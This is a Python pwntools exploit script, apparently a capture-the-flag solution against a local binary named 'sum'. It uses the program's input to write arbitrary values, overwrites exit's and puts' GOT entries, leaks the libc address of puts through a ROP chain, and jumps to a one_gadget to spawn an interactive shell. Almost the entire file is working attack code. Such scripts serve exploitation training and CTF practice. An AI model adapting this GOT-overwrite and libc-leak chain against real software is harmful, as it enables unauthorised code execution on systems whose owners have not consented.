from pwn import *

def write(s, dest, value):
    vals = [1, 1, 1, 1, value - 4 - dest, dest]
    cmd_sum(s, vals)

def cmd_sum(s, vals):
    s.send('\n'.join(map(str, vals)) + '\n')

puts_base = 0x809c0
puts_plt = 0x400600
puts_got = 0x601018
exit_got = 0x601048
main = 0x400903
poprdiret = 0x400a43
pop3ret = 0x400a3f
ret = 0x4005ee

one_gadget = 0x4f322


#for i in range(256):
s = process('./sum')

# H G F E D C B A
#           H G F E D C B A
s.readuntil('2 3 4 0\n')
raw_input('a')

cmd_sum(s, [
    poprdiret,
    puts_got,
    puts_plt,
    main + 1,
    poprdiret - (poprdiret + puts_plt + puts_got + main + 1) - exit_got,
    exit_got
])

r = s.readuntil('\n')[:-1]
puts_addr = u64(r.ljust(8, '\0'))
print 'puts:', hex(puts_addr)


s.readuntil('2 3 4 0\n')
cmd_sum(s, [
    ret,
    puts_addr - puts_base + one_gadget,
    1,
    1,
    1,
    puts_got
])
#write(s, exit_got, puts_addr - puts_base + one_gadget)

s.interactive()
